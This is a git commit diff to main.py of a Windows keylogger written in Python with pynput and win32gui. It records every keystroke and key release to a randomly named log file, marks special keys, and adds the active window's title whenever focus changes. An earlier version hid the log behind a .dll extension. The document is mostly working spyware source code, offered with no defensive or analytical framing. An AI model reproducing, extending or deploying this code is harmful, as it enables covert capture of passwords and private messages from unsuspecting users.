6f67e43f2c9d577b6835b2a3102a028fb6b21143
fearherbs1 <fearherbs1@gmail.com>
2021-06-26 14:11:43 -0400

    add window checking better formatting

--- main.py
+++ main.py
@@ -2,18 +2,38 @@ import pynput
 import base64
 import random
 import string
+import threading
+import os
 from pynput import keyboard
 from win32gui import GetWindowText, GetForegroundWindow
 
 
 # generate a random filename for our log file
-fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".dll"
+fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".txt"
 
+"""
+def windowlog():
+    # watch our current active window and write to our log file if it changes
+    currentwindow = (GetWindowText(GetForegroundWindow()))
+    while True:
+        checkwindow = (GetWindowText(GetForegroundWindow()))
+        if currentwindow != checkwindow:
+            with open(fname, "a+") as f:
+                f.write(f"\n### Window Changed to {checkwindow} ###\n")
+            currentwindow = checkwindow
+"""
 
 def log():
-    currentwindow = (GetWindowText(GetForegroundWindow()))
 
     def on_press(key):
+        global currentwindow
+        checkwindow = (GetWindowText(GetForegroundWindow()))
+        if currentwindow != checkwindow:
+            with open(fname, "a+") as f:
+                f.write("\n\n")
+                f.write(f"### Window Changed to \"{checkwindow}\" ###")
+                f.write("\n")
+            currentwindow = checkwindow
         kl = []
         ks = str(key).strip("'")
         kl.append(ks)
@@ -21,13 +41,52 @@ def log():
         kl = []
 
     def on_release(key):
-        r = str(key)
+        onreleasekeys = ["Key.cmd", "Key.ctrl_l", "Key.ctrl_r", "Key.alt_gr", "Key.alt", "Key.delete"]
+        klr = []
+        ksr = str(key).strip("'")
+        klr.append(ksr)
+        log_file_release(klr)
+        klr = []
+
+    def log_file_release(klr):
+        with open(fname, "a+") as f:
+            for key in klr:
+                if "Key.cmd" in key:
+                    f.write(" {cmd_r} ")
+                elif "Key.ctrl_l" in key:
+                    f.write(" {lctrl_r} ")
+                elif "Key.ctrl_r" in key:
+                    f.write(" {rctrl_r} ")
+                elif "Key.alt_gr" in key:
+                    f.write(" {altgr_r} ")
+                elif "Key.alt" in key:
+                    f.write(" {alt_r} ")
+                elif "Key.shift" in key:
+                    f.write(" {sft_r} ")
+                else:
+                    continue
 
     def log_file(kl):
         with open(fname, "a+") as f:
             for key in kl:
                 if "Key.space" in key:
-                    f.write("\n")
+                    f.write(" {sp} ")
+                elif "Key.backspace" in key:
+                    f.write(" {bsp} ")
+                elif "Key.enter" in key:
+                    f.write(" {ent} ")
+                elif "Key.tab" in key:
+                    f.write(" {tab} ")
+                elif "Key.caps_lock" in key:
+                    f.write(" {cLok} ")
+                elif "Key.delete" in key:
+                    f.write(" {del} ")
+                elif "Key.ctrl_l" in key:
+                    f.write(" {lctrl} ")
+                elif "Key.ctrl_r" in key:
+                    f.write(" {rctrl} ")
+                elif "Key.shift" in key:
+                    f.write(" {sft} ")
                 else:
                     f.write(key)
 
@@ -35,5 +94,7 @@ def log():
     listener.start()
     listener.join()
 
+
+currentwindow = (GetWindowText(GetForegroundWindow()))
 
 log()
